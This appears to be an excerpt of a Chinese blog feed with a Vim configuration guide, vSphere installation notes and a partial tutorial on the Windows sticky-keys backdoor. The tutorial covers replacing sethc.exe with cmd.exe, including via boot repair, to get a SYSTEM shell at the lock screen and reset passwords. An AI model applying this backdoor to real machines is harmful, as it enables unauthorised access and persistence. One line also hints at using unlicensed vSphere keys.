<li>一句命令把 plug.vim 下载到 <code>.vim</code> 的 <code>autoload</code> 目录即安装完毕</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>

<ul>
<li>找主题 👉 <a href="https://vimcolorschemes.com/">https://vimcolorschemes.com/</a><ul>
<li>个人觉得不错的几个主题(都有airline、YouCompleteMe的主题配色)：<ul>
<li><a href="https://github.com/NLKNguyen/papercolor-theme">PaperColor</a></li>
<li><a href="https://github.com/cocopon/iceberg.vim">iceberg</a></li>
<li><a href="https://github.com/joshdick/onedark.vim">onedark</a></li>
</ul>
</li>
</ul>
</li>
<li>好看的启动页 👉 <a href="https://github.com/mhinz/vim-startify">startify</a></li>
<li>好看的 vim 状态栏 👉 <a href="https://github.com/vim-airline/vim-airline">vim-airline</a><ul>
<li>网上冲浪找到的 <code>airline</code> 配置: <a href="https://www.reddit.com/r/vim/comments/crs61u/best_airline_settings/">best_airline_settings</a></li>
</ul>
</li>
<li>分割线(对齐) 👉 <a href="https://github.com/Yggdroot/indentLine">indentLine</a></li>
<li>目录树 👉 <a href="https://github.com/preservim/nerdtree">nerdtree</a></li>
<li>undo撤销树 👉 <a href="https://github.com/mbbill/undotree">undotree</a></li>
<li>文件整体结构展示 👉 <a href="https://github.com/preservim/tagbar">tagbar</a></li>
<li>代码自动补全 👉 <a href="https://github.com/ycm-core/YouCompleteMe">YouCompleteMe</a></li>
<li>git支持插件 👉 <a href="https://github.com/tpope/vim-fugitive">fugitive</a></li>
<li>括号自动补全&#x2F;删除 👉 <a href="https://github.com/jiangmiao/auto-pairs">auto-pairs</a></li>
<li>模糊搜索插件 👉 <a href="https://github.com/Yggdroot/LeaderF">LeaderF</a></li>
<li>代码片段(模板) 👉 <a href="https://github.com/SirVer/ultisnips">Ultisnips</a></li>
<li>快速注释 👉 <a href="https://github.com/preservim/nerdcommenter">nerdcommenter</a></li>
<li>代码语法高亮插件 👉 <a href="https://github.com/sheerun/vim-polyglot">vim-polyglot</a></li>
</ul>
<blockquote>
<p>在不重启vim的情况下重载配置文件: <code>:source $MYVIMRC</code></p>
</blockquote>
<h3 id="个人用的插件集合"><a href="#个人用的插件集合" class="headerlink" title="个人用的插件集合"></a>个人用的插件集合</h3><details class="note info"><summary><p><code>.vimrc</code> 中的 <code>vim-plug</code> 插件列表</p>
</summary>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">call</span> plug#begin()</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; vim 启动屏幕，可显示最近打开的文件</span></span><br><span class="line">Plug <span class="string">&#x27;mhinz/vim-startify&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 主题</span></span><br><span class="line">Plug <span class="string">&#x27;NLKNguyen/papercolor-theme&#x27;</span></span><br><span class="line"><span class="comment">&quot; Plug &#x27;cocopon/iceberg.vim&#x27;</span></span><br><span class="line"><span class="comment">&quot; Plug &#x27;joshdick/onedark.vim&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 图标</span></span><br><span class="line">Plug <span class="string">&#x27;ryanoasis/vim-devicons&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 底部状态栏增强</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline-themes&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 目录树</span></span><br><span class="line">Plug <span class="string">&#x27;preservim/nerdtree&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 撤销树</span></span><br><span class="line">Plug <span class="string">&#x27;mbbill/undotree&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 展示文件整体结构</span></span><br><span class="line">Plug <span class="string">&#x27;preservim/tagbar&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim git插件</span></span><br><span class="line">Plug <span class="string">&#x27;tpope/vim-fugitive&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 括号自动补全</span></span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 快速模糊搜索</span></span><br><span class="line">Plug <span class="string">&#x27;Yggdroot/LeaderF&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: <span class="string">&#x27;:LeaderfInstallCExtension&#x27;</span> &#125;</span><br><span class="line"><span class="comment">&quot; vim 分割线</span></span><br><span class="line">Plug <span class="string">&#x27;Yggdroot/indentLine&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 代码自动补全</span></span><br><span class="line">Plug <span class="string">&#x27;ycm-core/YouCompleteMe&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 代码块</span></span><br><span class="line">Plug <span class="string">&#x27;SirVer/ultisnips&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;honza/vim-snippets&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 代码模板</span></span><br><span class="line">Plug <span class="string">&#x27;chxuan/prepare-code&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 快速注释</span></span><br><span class="line"><span class="comment">&quot; Plug &#x27;scrooloose/nerdcommenter&#x27;</span></span><br><span class="line"><span class="comment">&quot; vim 语法高亮</span></span><br><span class="line">Plug <span class="string">&#x27;sheerun/vim-polyglot&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#end()</span><br></pre></td></tr></table></figure>
</details>


<h2 id="个人使用的-vimrc-配置"><a href="#个人使用的-vimrc-配置" class="headerlink" title="个人使用的 .vimrc 配置"></a>个人使用的 <code>.vimrc</code> 配置</h2><p>🤔完整的配置文件备份在<a href="https://github.com/ex7l0it/config/blob/main/backup_cfgbkc/vim/.vimrc">这里</a> </p>
<p>这里就放一点不带插件配置的基本设置内容好了(内容不再更新, 新的在👆):</p>
<details class="note info"><summary><p><code>.vimrc</code> 基本配置</p>
</summary>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 语法高亮</span></span><br><span class="line"><span class="keyword">syntax</span> enable</span><br><span class="line"><span class="comment">&quot; 启用256色</span></span><br><span class="line"><span class="keyword">set</span> t_Co=<span class="number">256</span></span><br><span class="line"><span class="keyword">set</span> encoding=utf-<span class="number">8</span>              <span class="comment">&quot; 指定使用utf-8</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="keyword">on</span>              <span class="comment">&quot; 文件类型检测</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">number</span>                      <span class="comment">&quot; 开启行号</span></span><br><span class="line"><span class="keyword">set</span> cursorline                  <span class="comment">&quot; 高亮显示当前行</span></span><br><span class="line"><span class="keyword">set</span> linebreak                   <span class="comment">&quot; 只有遇到指定符号才换行</span></span><br><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span>                <span class="comment">&quot; 显示状态栏</span></span><br><span class="line"><span class="keyword">set</span> virtualedit=block,onemore   <span class="comment">&quot; 允许光标出现在最后一个字符的后面</span></span><br><span class="line"><span class="keyword">set</span> backspace=<span class="built_in">indent</span>,eol,start  <span class="comment">&quot; 设置backspace可在INSERT模式下删除</span></span><br><span class="line"><span class="string">&quot; set cmdheight=2                 &quot;</span> 设置命令行的高度</span><br><span class="line"><span class="keyword">set</span> showcmd                     <span class="comment">&quot; 在命令行显示输入的命令</span></span><br><span class="line"><span class="keyword">set</span> ttimeoutlen=<span class="number">0</span>               <span class="comment">&quot; 设置&lt;ESC&gt;键响应时间</span></span><br><span class="line"><span class="comment">&quot; 在命令模式下启用命令补全</span></span><br><span class="line"><span class="keyword">set</span> wildmenu</span><br><span class="line"><span class="keyword">set</span> wildmode=longes<span class="variable">t:list</span>,full</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> autoindent                  <span class="comment">&quot; 设置自动缩进</span></span><br><span class="line"><span class="keyword">set</span> smartindent                 <span class="comment">&quot; 智能选择对齐方式</span></span><br><span class="line"><span class="keyword">set</span> expandtab                   <span class="comment">&quot; 将制表符扩展为空格</span></span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span>                   <span class="comment">&quot; 设置tab=4空格</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span>                <span class="comment">&quot; 设置缩进为4空格</span></span><br><span class="line"><span class="keyword">set</span> smarttab                    <span class="comment">&quot; 在行和段开始处使用制表符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> hlsearch                    <span class="comment">&quot; 高亮显示搜索结果</span></span><br><span class="line"><span class="keyword">set</span> incsearch                   <span class="comment">&quot; 开启实时搜索功能</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> nobackup                    <span class="comment">&quot; 设置不备份</span></span><br><span class="line"><span class="keyword">set</span> noswapfile                  <span class="comment">&quot; 禁止生成临时文件</span></span><br><span class="line"><span class="keyword">set</span> autowrite                   <span class="comment">&quot; 设置自动保存</span></span><br><span class="line"><span class="keyword">set</span> autoread                    <span class="comment">&quot; 自动重新文件更改</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">confirm</span>                     <span class="comment">&quot; 在处理未保存或只读文件的时候，弹出确认</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 保留撤销历史</span></span><br><span class="line"><span class="keyword">if</span> !isdirectory($HOME.<span class="string">&quot;/.vim&quot;</span>)</span><br><span class="line">    <span class="keyword">call</span> <span class="built_in">mkdir</span>($HOME.<span class="string">&quot;/.vim&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0700</span>)</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="keyword">if</span> !isdirectory($HOME.<span class="string">&quot;/.vim/.undo&quot;</span>)</span><br><span class="line">    <span class="keyword">call</span> <span class="built_in">mkdir</span>($HOME.<span class="string">&quot;/.vim/.undo&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0700</span>)</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="keyword">set</span> undodir=~/.<span class="keyword">vim</span>/.<span class="keyword">undo</span>//</span><br><span class="line"><span class="keyword">set</span> <span class="built_in">undofile</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置记录的历史操作次数</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">history</span>=<span class="number">1000</span></span><br><span class="line"><span class="comment">&quot; 当重新打开文件时光标回到上一次所在位置</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">has</span>(<span class="string">&#x27;viminfo&#x27;</span>)</span><br><span class="line">    <span class="keyword">autocmd</span> BufWinLeave ?* <span class="keyword">mkview</span>              <span class="comment">&quot; 在离开缓冲区时保存视图</span></span><br><span class="line">    <span class="keyword">autocmd</span> BufWinEnter ?* <span class="keyword">silent</span> <span class="keyword">loadview</span>     <span class="comment">&quot; 在进入缓冲区时加载视图</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 自定义映射</span></span><br><span class="line"><span class="comment">&quot; 配置 U 为重做</span></span><br><span class="line"><span class="keyword">nnoremap</span> U <span class="symbol">&lt;C-r&gt;</span></span><br><span class="line"><span class="comment">&quot; 修改连按kj为ESC</span></span><br><span class="line"><span class="keyword">inoremap</span> kj <span class="symbol">&lt;ESC&gt;</span></span><br></pre></td></tr></table></figure>
</details>

<h3 id="关于配置文件的详细解释"><a href="#关于配置文件的详细解释" class="headerlink" title="关于配置文件的详细解释"></a>关于配置文件的详细解释</h3><ul>
<li><code>set nocompatible</code> 有无必要写在 vimrc 中?<ul>
<li>当 vim 检测到有 <code>.vimrc</code> 时会默认关闭 vi 兼容，所以根本用不着加这个</li>
<li>可查看官方文档中的解释: <code>:help nocompatible</code></li>
</ul>
</li>
<li><code>syntax on</code> vs <code>syntax enable</code><ul>
<li><code>syntax enable</code> 不会覆盖先前的 <code>highlight</code> 设置，可以将 <code>:highlight</code> 命令放在它前面; <code>syntax on</code> 则会用默认的高亮颜色覆盖先前的配置</li>
<li>可以查看官方文档中的解释: <code>:help syntax-on</code></li>
</ul>
</li>
<li>按键映射设置相关，形如 <code>&lt;C-n&gt;</code> 的解释:<ul>
<li>查看官方文档: <code>:help key-notation</code></li>
</ul>
</li>
</ul>
<details class="note info"><summary><p><code>:help key-notation</code> 中一部分可能较为常用的内容</p>
</summary>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">                                        key-notation key-codes keycodes</span><br><span class="line">These names for keys are used in the documentation.  They can also be used</span><br><span class="line">with the &quot;:map&quot; command (insert the key name by pressing CTRL-K and then the</span><br><span class="line">key you want the name for).</span><br><span class="line"></span><br><span class="line">notation        meaning             equivalent  decimal value(s)</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">...</span><br><span class="line">&lt;CR&gt;            carriage return         CTRL-M   13     carriage-return</span><br><span class="line">&lt;Return&gt;        same as &lt;CR&gt;                            &lt;Return&gt;</span><br><span class="line">&lt;Enter&gt;         same as &lt;CR&gt;                            &lt;Enter&gt;</span><br><span class="line">&lt;Esc&gt;           escape                  CTRL-[   27     escape &lt;Esc&gt;</span><br><span class="line">&lt;Space&gt;         space                            32     space</span><br><span class="line">...</span><br><span class="line">&lt;S-...&gt;         shift-key                       shift &lt;S-</span><br><span class="line">&lt;C-...&gt;         control-key                     control ctrl &lt;C-</span><br><span class="line">&lt;M-...&gt;         alt-key or meta-key             meta alt &lt;M-</span><br><span class="line">&lt;A-...&gt;         same as &lt;M-...&gt;                 &lt;A-</span><br><span class="line">&lt;D-...&gt;         command-key (Macintosh only)    &lt;D-</span><br><span class="line">&lt;t_xx&gt;          key with &quot;xx&quot; entry in termcap</span><br></pre></td></tr></table></figure>
</details>

<ul>
<li>按键映射中 <code>map</code>、<code>noremap</code>、<code>nnoremap</code> 有何区别？<ul>
<li>这里有个回答: <a href="https://vi.stackexchange.com/questions/2089/what-are-the-differences-between-the-map-noremap-abbrev-and-noreabbrev-command">What are the differences between the map, noremap, abbrev and noreabbrev commands?</a><ul>
<li><code>map</code> 与 <code>noremap</code> 的区别在于 <code>noremap</code> 是非递归版本, 只解析一次; <code>nnoremap</code> 则是指定在 Normal Mode 下才生效的按键映射</li>
</ul>
</li>
<li>也可直接看文档: <code>:help map-overview</code></li>
</ul>
</li>
</ul>
<h2 id="使用过程中的一些小问题"><a href="#使用过程中的一些小问题" class="headerlink" title="使用过程中的一些小问题"></a>使用过程中的一些小问题</h2><ul>
<li>当复制粘贴一大段代码时缩进混乱<ul>
<li>原因: <a href="https://vim.fandom.com/wiki/Toggle_auto-indenting_for_code_paste">自动缩进导致</a></li>
<li>解决方案:<ul>
<li>方案1: 先执行 <code>:set paste</code>，然后复制粘贴，完事 <code>:set nopaste</code></li>
<li>方案2: <a href="https://stackoverflow.com/questions/2514445/turning-off-auto-indent-when-pasting-text-into-vim/38258720#38258720">懒人配置</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<details class="note info"><summary><p><code>.vimrc</code> 懒人专用配置</p>
</summary>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &amp;t_SI .= <span class="string">&quot;\&lt;Esc&gt;[?2004h&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_EI .= <span class="string">&quot;\&lt;Esc&gt;[?2004l&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;special&gt;</span> <span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;Esc&gt;</span>[<span class="number">200</span>~ XTermPasteBegin()</span><br><span class="line"></span><br><span class="line"><span class="keyword">function!</span> <span class="title">XTermPasteBegin</span><span class="params">()</span></span><br><span class="line">  <span class="keyword">set</span> pastetoggle=<span class="symbol">&lt;Esc&gt;</span>[<span class="number">201</span>~</span><br><span class="line">  <span class="keyword">set</span> paste</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br></pre></td></tr></table></figure>
</details>

<ul>
<li>遇到稀奇古怪的高亮显示问题(例如 Dockerfile 中指令后 <code>[&quot;&quot;]</code> 的引号被隐藏且引号内的内容被高亮显示)<ul>
<li>原因: 缺少支持的语法高亮</li>
<li>解决方案: 安装插件解决 -&gt; <a href="https://github.com/sheerun/vim-polyglot">vim-polyglot</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>助教课件</tag>
      </tags>
  </entry>
  <entry>
    <title>vSphere 安装 &amp; 配置</title>
    <url>/2023/10/13/vsphere/</url>
    <content><![CDATA[<h1 id="vSphere"><a href="#vSphere" class="headerlink" title="vSphere"></a>vSphere</h1><p>VMware vSphere 是 VMware 服务器虚拟化产品套件，包括有 VMware ESXi, VMware vCenter Server, VMware vSphere Client 等（除了这仨之外的👴没用过）</p>
<ul>
<li>本文只记录本人挖坑填坑过程中的些许经验，详细的内容请参考大佬🚪的博客&#x2F;文档</li>
</ul>
<blockquote>
<p>写博客的时候发现有佬整理了运维知识库：</p>
<ul>
<li><a href="http://www.chrisjing.com/017-Vmware%E4%BC%81%E4%B8%9A%E8%99%9A%E6%8B%9F%E5%8C%96/01-esxi%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2/">ESXi服务部署</a></li>
<li><a href="http://www.chrisjing.com/017-Vmware%E4%BC%81%E4%B8%9A%E8%99%9A%E6%8B%9F%E5%8C%96/02-vcenter%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2/">vCenter 服务部署</a></li>
</ul>
</blockquote>
<h2 id="vCenter-Server-安装"><a href="#vCenter-Server-安装" class="headerlink" title="vCenter Server 安装"></a>vCenter Server 安装</h2><ul>
<li>实际需求：<ul>
<li>内网下搭建 vCenter Server, 用于管理 ESXi 主机, 考虑仅对外开放 vSphere Client 的 Web 入口</li>
<li>考虑权限问题：公用账号、个人账号、管理账号<ul>
<li>非管理员只能操控权限内的虚拟机开关机、重启、挂载 ISO 镜像等</li>
</ul>
</li>
</ul>
</li>
<li>坑点：<ul>
<li>多台 ESXi 主机分布在不同的路由器子网下导致与 vCenter Server 通信是个问题</li>
<li>处于一个混乱的网络拓扑：总之挺混乱</li>
<li>vSphere Client 登录时需要去访问单点登录服务，这玩意没法用 IP + 端口转发，重定向直接寄</li>
</ul>
</li>
<li>最后解决方案：<ul>
<li>linux 虚拟机做路由转发 + 第三台路由器 👉 解决通信问题</li>
<li>使用 FQDN + NAT端口转发 👉 解决单点登录</li>
<li>可能还有更好的解决方案，👴能力有限，就先这么折腾了</li>
</ul>
</li>
</ul>
<p>安装包: <a href="https://blog.whsir.com/post-5826.html">下载资源</a></p>
<h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><ol>
<li>Windows 下挂载镜像后直接执行 <code>vcsa-ui-installer\win32\installer.exe</code> ，选择安装</li>
<li>下一步，同意协议后填写部署目标的 ESXi 主机的相关信息(主机名、服务端口、用户名、密码)</li>
<li>按照实际情况选择部署大小、存储位置</li>
<li>进行网络配置：</li>
</ol>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020230629172145.png" alt="Pasted image 20230629172145" style="zoom:50%;" />



<p>根据实际情况选择网络，然后配置 IP 地址（建议静态分配，手动指定 IP 及 DNS 服务器等）</p>
<p>FQDN 是可选项，如果需要通过域名访问 vCenter，则可以填写所要使用的域名，需要保证在指定的网络下能够解析该域名，且域名解析结果需要与 IPv4 配置的地址一致（否则第二阶段安装会卡在开始的0%）</p>
<p>如果不需要域名访问，那么 FQDN 留空，指定 IP 地址，这个 IP 地址将是登录访问 vCenter 的唯一入口（无法通过搭建反向代理或端口转发间接访问）</p>
<ol start="5">
<li>等待第一阶段安装完成，进入第二阶段安装（第二阶段安装也可以通过 vCenter Server 虚拟机页面中显示的网页链接访问进行）</li>
<li>配置 NTP 服务器，可以使用 <code>ntp.aliyun.com</code></li>
<li>SSO 配置：创建新域，指定 Single Sign-On 域名时如果没啥特殊需求就保持为默认的 <code>vsphere.local</code><ul>
<li>(不然在后面第二阶段安装时如果这里域名解析失败，会卡在 <code>22%(Starting VMware Security Token Service...)</code>) 👴搁这重装了不知道几遍</li>
</ul>
</li>
<li>下一步等待第二阶段安装完成</li>
<li>登录时账号是 <code>administrator@vsphere.local</code> (默认的标识源是 <code>localos</code>，所以这里需要显式标明上面的 SSO 域名 <code>vsphere.local</code>，后续可以在 SSO 配置中修改默认标识源)</li>
<li>许可证：网上一堆</li>
</ol>
<blockquote>
<p>一堆坑点：</p>
<ul>
<li>常见端口还是默认的 80 和 443 为好，改了会寄（反正👴弄不好）</li>
<li>如果有域名，最好还是填写 FQDN（👴部署的时候填了这个）</li>
<li>在第 7 步中，如果使用创建新的 SSO 域，不要去修改默认的 <code>vsphere.local</code>，不然会导致第二阶段安装卡在 <code>22%(Starting VMware Security Token Service...)</code></li>
</ul>
</blockquote>
<h2 id="用户权限限制"><a href="#用户权限限制" class="headerlink" title="用户权限限制"></a>用户权限限制</h2><ul>
<li>对于这个权限分配，👴瞎折腾一顿总结的教训：<ul>
<li>权限配置需要创建一个角色，对角色分配特权<ul>
<li>进入 <code>系统管理-访问控制-角色</code> 进行新建&#x2F;编辑</li>
<li>这里根据实际情况分配</li>
</ul>
</li>
<li>然后需要创建一个用户组，然后在权限配置中给这个用户组分配角色<ul>
<li>从清单中选择需要指定的资源，在其中的权限页面进行添加&#x2F;编辑 </li>
<li>或进入 <code>系统管理-访问控制-全局权限</code> 进行添加&#x2F;编辑</li>
</ul>
</li>
<li>最后把用户加入到用户组，这个用户就有对应的权限了<ul>
<li>进入 <code>Single Sign On - 用户和组 - 组</code> 进行添加</li>
</ul>
</li>
<li>(需要保证用户在某一计算资源中有权限，不然直接没法登录)<ul>
<li>不然会有这提示: <code>无法登录，因为您在连接到此客户端的所有 vCenter Server 系统上均没有权限。</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>更多内容参考官方文档:</p>
<blockquote>
<ul>
<li><a href="https://docs.vmware.com/cn/VMware-vSphere/7.0/com.vmware.vsphere.security.doc/GUID-4D0F8E63-2961-4B71-B365-BBFA24673FDB.html">常见任务的所需特权</a></li>
<li><a href="https://docs.vmware.com/cn/VMware-vSphere/7.0/com.vmware.vsphere.security.doc/GUID-5372F580-5C23-4E9C-8A4E-EF1B4DD9033E.html">vSphere 权限和用户管理任务</a></li>
</ul>
</blockquote>
<h2 id="镜像内容库"><a href="#镜像内容库" class="headerlink" title="镜像内容库"></a>镜像内容库</h2><ul>
<li>2023.10.18更：内容库是用来在不同的 vCenter Server 之间共享数据的，这创建的镜像内容库只能在存储所在的 ESXi 主机中发现，同 vCenter Server 下的其他 ESXi 主机发现不了😅… 还是得跟 NFS 结合</li>
<li>TODO: 整理下面这一堆混乱的内容</li>
</ul>
<h3 id="NFS-共享存储"><a href="#NFS-共享存储" class="headerlink" title="NFS 共享存储"></a>NFS 共享存储</h3><ul>
<li>搭建一个 NFS 服务器，给读写权限</li>
<li>vSphere Client 中选择数据中心，添加数据存储时选择 NFS，填好 NFS 服务器信息，勾上所有主机添加即可</li>
</ul>
<h3 id="内容库配置"><a href="#内容库配置" class="headerlink" title="内容库配置"></a>内容库配置</h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231015160001086.png" alt="image-20231015160001086"></p>
<ul>
<li>在搭建 vCenter Server 之前，各台 ESXi 主机都是各自主机上单独存储的系统镜像，混乱又不方便</li>
<li>前段时间是考虑搭建了一个 nfs 服务器，把所有镜像挂载上去，然后各 ESXi 主机挂载 nfs 类型的数据存储<ul>
<li>但是这个也坑的很：网络波动或者系统重启时 nfs 服务器启动晚于 ESXi 挂载，挂载失败导致错误，之后只能手动全部卸载存储再重新挂载</li>
<li>等看看怎么解决这个问题，还是老老实实用着 NFS 吧😅</li>
</ul>
</li>
<li>结合内容库<ul>
<li>新建内容库的存储资源选择上面挂载的 NFS 存储</li>
<li>需求是要把先前的普通用户再加上一个内容库管理的权限（能挂载 ISO 镜像、能上传镜像）</li>
<li>👴直接参考自带的内容库管理员角色，把权限直接都加上了，但就是不好使（看不到内容库）</li>
<li>最后还是再创建一个新用户组，给这个新用户组分配默认的 <code>内容库管理员(示例)</code> 角色，然后把普通用户加入到这个新用户组，才好使</li>
<li>😅很烦的是这权限更改完成后得重新登录才生效</li>
<li>配置完成后虚拟机编辑设置中的 <code>CD/DVD 驱动器</code> 选择 <code>内容库 ISO 文件</code>即可</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>Ops</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 粘滞键后门</title>
    <url>/2021/01/28/windows-sticky-keys-backdoor/</url>
    <content><![CDATA[<h1 id="Windows-粘滞键后门"><a href="#Windows-粘滞键后门" class="headerlink" title="Windows 粘滞键后门"></a>Windows 粘滞键后门</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>众所周知，在 Windows 下连续按五次 Shift 键会触发粘滞键：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611909983061-2a1e084e-7c4b-4382-b37f-27404598d119.png" alt="image.png"></p>
<p>粘滞键程序路径为：<code>C:\Windwos\System32\sethc.exe</code>，当未登录用户时，粘滞键是以 <code>system</code> 用户启动的粘滞键后门即是将 cmd.exe 替换掉 sethc.exe，使得按五次 Shift 键后启动 cmd 窗口，然后我们即可利用 <code>system</code> 权限进行管理员用户创建等操作。</p>
<h2 id="后门创建"><a href="#后门创建" class="headerlink" title="后门创建"></a>后门创建</h2><h3 id="重命名-sethc-exe"><a href="#重命名-sethc-exe" class="headerlink" title="重命名 sethc.exe"></a>重命名 sethc.exe</h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611911922375-1d57491b-86b5-49c9-99c2-6392adc0f010.png" alt="image.png"></p>
<p>但是访问被拒绝需要先修改权限：<code>属性-安全-所有者</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611912013373-450445f2-5f71-4779-bf3a-187b108b8d0c.png" alt="image.png"></p>
<p>修改所有者为 Administrator：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611912058218-c708b69d-4dee-4904-99f8-326e24f8c926.png" alt="image.png"></p>
<p>确定后重新打开属性选项卡，修改 Administrators 组权限：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611912130153-834749dc-6f26-4297-bf60-566825b5aaa8.png" alt="image.png"></p>
<p>确定后即可成功修改文件名：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611912172881-b4833f54-a39d-4890-84c3-68d8bb366232.png" alt="image.png"></p>
<h3 id="将-cmd-exe-副本重命名为-sethc-exe"><a href="#将-cmd-exe-副本重命名为-sethc-exe" class="headerlink" title="将 cmd.exe 副本重命名为 sethc.exe"></a>将 cmd.exe 副本重命名为 sethc.exe</h3><p>复制一份 cmd.exe 重命名：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611912496855-cdedf8de-4e70-48eb-9e55-45a1bb699fcf.png" alt="image.png"></p>
<h3 id="测试后门"><a href="#测试后门" class="headerlink" title="测试后门"></a>测试后门</h3><p>锁定屏幕，连按五次 Shift 触发：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611912527330-26a4f702-90a7-4ca5-9ecf-0ce8c23327f0.png" alt="image.png"></p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="修改系统密码"><a href="#修改系统密码" class="headerlink" title="修改系统密码"></a>修改系统密码</h3><p>当不知道系统密码的时候，可以利用粘滞键后门进行修改：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611912701164-92fb807f-efd2-4435-9a25-2aa7530313b3.png" alt="image.png"></p>
<h4 id="进入启动修复"><a href="#进入启动修复" class="headerlink" title="进入启动修复"></a>进入启动修复</h4><p>重启系统，在系统启动时强制关机，触发错误恢复：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611913076010-88f1d38c-c513-4e87-8dea-fa4b06640e76.png" alt="image.png"></p>
<p>然后进行漫长的等待：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611913184158-34611fcb-92dc-41b4-9924-079067849155.png" alt="image.png"></p>
<p>点进详细信息，打开一个txt文件：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611913577400-e7c8f72f-a380-4a31-abe5-07300483e8c7.png" alt="image.png"></p>
<p>通过文件-打开，</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611913615753-e22a1f62-6363-4c55-8355-70d9bb72b00c.png" alt="image.png"></p>
<p>要选择所有文件</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611913670230-a05bfdd4-076b-4894-9c6e-10d9efbffa70.png" alt="image.png"></p>
<h4 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h4><p>找 sethc.exe ，然后进行重命名操作：这里直接修改，无需修改权限</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611913710439-dd6afb24-21c7-4144-843c-44cc5b362a7c.png" alt="image.png"></p>
<p>将 cmd.exe copy一份，重命名：</p>
